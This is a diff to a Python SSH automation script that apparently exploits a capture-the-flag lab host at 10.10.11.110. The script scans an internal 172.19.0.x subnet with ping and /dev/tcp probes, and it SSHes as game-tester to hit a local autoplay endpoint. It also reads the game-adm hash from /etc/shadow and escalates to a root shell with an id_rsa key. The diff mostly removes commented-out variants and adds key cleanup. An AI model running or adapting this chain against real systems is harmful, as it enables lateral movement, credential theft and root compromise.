@@ -317,8 +317,6 @@ def Game_Tester(username,password):
 
 	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
 
-#	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
-
 	ssh_session.interact()
 
 def Game_Tester2(username,password):
@@ -327,14 +325,7 @@ def Game_Tester2(username,password):
 
 	client.connect('10.10.11.110', username=username, password=password)
 
-#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
-
 	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "curl http://127.0.0.1:9999/autoplay -d \'rounds=-1\'"')
-
-
-#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
-
-#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
 
 def Get_Hash_Adm(username,password):
 	client = paramiko.SSHClient()
@@ -342,11 +333,7 @@ def Get_Hash_Adm(username,password):
 
 	client.connect('10.10.11.110', username=username, password=password)
 
-#	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
-
 	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
-
-#	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
 
 	Hash_Adm = stdout.read().decode('utf-8')
 
@@ -410,10 +397,6 @@ if __name__ == "__main__":
 
 	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()
 
-#	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Game_Tester).start()
-
-#	Game_Tester(User_drew, Pass_drew)
-
 	Game_Tester2(User_drew, Pass_drew)
 
 	time.sleep(40)
@@ -436,5 +419,7 @@ if __name__ == "__main__":
 	os.system('chmod 600 id_rsa')
 
 	GetRoot_Shell()
+
+	os.remove('id_rsa')
 
 
